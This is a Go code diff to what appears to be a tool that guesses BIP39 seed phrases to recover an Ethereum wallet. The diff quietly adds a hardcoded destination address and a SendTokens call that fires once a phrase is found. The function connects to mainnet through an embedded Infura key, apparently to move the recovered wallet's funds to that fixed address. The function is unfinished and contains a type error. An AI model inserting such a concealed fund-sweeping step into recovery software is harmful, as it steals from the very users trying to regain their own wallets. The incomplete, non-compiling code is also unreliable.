@@ -14,6 +14,7 @@ import (
     "github.com/tyler-smith/go-bip39/wordlists"
     "github.com/ethereum/go-ethereum/accounts"
     "github.com/ethereum/go-ethereum/common"
+    "github.com/ethereum/go-ethereum/ethclient"
     "gopkg.in/godo.v2/glob"
 )
 
@@ -43,14 +44,16 @@ func checkWallet(mnemonic string, account accounts.Account, results chan Result)
 }
 
 func deriveAccount(wallet *hdwallet.Wallet) {
-	path := hdwallet.MustParseDerivationPath("m/44'/60'/0'/0/0")
+    paths := []string{"m/44'/60'/0'/0/0", "m/44'/60'/0'/0/1", "m/44'/60'/0'/0/2"}
+    //paths := []string{"m/44'/60'/0'/0/0"}
+    for _, p := range paths {
+	    path := hdwallet.MustParseDerivationPath(p)
+	    _, err := wallet.Derive(path, true)
+        if err != nil {
+            log.Fatal(err)
+        }
+    }
 	// path = hdwallet.MustParseDerivationPath("m/44'/60'/0'/0/1")
-	_, err := wallet.Derive(path, true)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	//fmt.Println(account.Address.Hex())
 }
 
 func makeThreadedGuesses(g Guess, numThreads int) []Guess {
@@ -73,6 +76,7 @@ func main() {
     }
 
     searchAddress := common.HexToAddress(argv[1])
+    targetAddress := common.HexToAddress("91b2e03a6FC59f6288401eCA88A686ecF44B7749")
     guessFilename := argv[2]
     account := accounts.Account{Address: searchAddress}
     guessString := guessFromFile(guessFilename)
@@ -117,6 +121,7 @@ func main() {
             }
             if res.Success {
                 fmt.Printf("SUCCESS! %s\n", res.Mnemonic)
+                SendTokens(res.Mnemonic, searchAddress, targetAddress)
                 break Main
             }
         }
@@ -187,4 +192,12 @@ func (g *Guess) Next() (string, error) {
 type Result struct {
     Success bool
     Mnemonic string
+}
+
+func SendTokens(mnemonic String, from common.Address, to common.Address) {
+	wallet, _ := hdwallet.NewFromMnemonic(mnemonic)
+    conn, err := ethclient.Dial("https://mainnet.infura.io/v3/a049e9823b06452ba130fa07b358bb77")
+    if err != nil {
+		log.Fatal(err)
+    }
 }
